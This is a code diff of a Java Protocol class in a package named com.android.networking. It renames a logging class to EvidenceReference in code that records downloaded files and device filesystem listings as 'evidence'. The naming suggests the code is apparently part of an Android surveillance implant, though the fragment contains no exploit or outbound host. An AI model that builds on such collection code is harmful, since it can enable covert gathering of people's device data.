@@ -23,7 +23,7 @@ import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfType;
 
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.file.AutoFile;
 import com.android.networking.file.Directory;
 import com.android.networking.file.Path;
@@ -93,7 +93,7 @@ public abstract class Protocol implements iProtocol {
 		}
 
 		if (success) {
-			LogR.info(Messages.getString("5.1")); //$NON-NLS-1$
+			EvidenceReference.info(Messages.getString("5.1")); //$NON-NLS-1$
 			return true;
 		} else {
 			return false;
@@ -244,7 +244,7 @@ public abstract class Protocol implements iProtocol {
 		final byte[] additional = Protocol.logDownloadAdditional(filename);
 		// final Evidence log = new Evidence(0);
 
-		LogR.atomic(EvidenceType.DOWNLOAD, additional, content);
+		EvidenceReference.atomic(EvidenceType.DOWNLOAD, additional, content);
 
 		// log.atomicWriteOnce(additional, EvidenceType.DOWNLOAD, content);
 
@@ -303,7 +303,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the path
 	 */
 	public static void saveFilesystem(final int depth, String path) {
-		LogR fsLog = new LogR(EvidenceType.FILESYSTEM);
+		EvidenceReference fsLog = new EvidenceReference(EvidenceType.FILESYSTEM);
 		
 
 		// Expand path and create log
@@ -339,7 +339,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandRoot(final LogR fsLog, final int depth) {
+	private static void expandRoot(final EvidenceReference fsLog, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
@@ -357,7 +357,7 @@ public abstract class Protocol implements iProtocol {
 	 *            the filepath
 	 * @return true, if successful
 	 */
-	private static boolean saveFilesystemLog(final LogR fsLog, final String filepath) {
+	private static boolean saveFilesystemLog(final EvidenceReference fsLog, final String filepath) {
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
 		}
@@ -420,7 +420,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param fsLog
 	 *            the fs log
 	 */
-	private static void saveRootLog(final LogR fsLog) {
+	private static void saveRootLog(final EvidenceReference fsLog) {
 		final int version = 2010031501;
 		if (Cfg.DEBUG) {
 			Check.requires(fsLog != null, "fsLog null"); //$NON-NLS-1$
@@ -434,6 +434,7 @@ public abstract class Protocol implements iProtocol {
 		databuffer.writeLong(0);
 		databuffer.writeLong(DateTime.getFiledate(new Date()));
 		databuffer.write(WChar.getBytes("/")); //$NON-NLS-1$
+		
 		fsLog.write(content);
 	}
 
@@ -448,7 +449,7 @@ public abstract class Protocol implements iProtocol {
 	 * @param depth
 	 *            the depth
 	 */
-	private static void expandPath(final LogR fsLog, final String path, final int depth) {
+	private static void expandPath(final EvidenceReference fsLog, final String path, final int depth) {
 		if (Cfg.DEBUG) {
 			Check.requires(depth > 0, "wrong recursion depth"); //$NON-NLS-1$
 		}
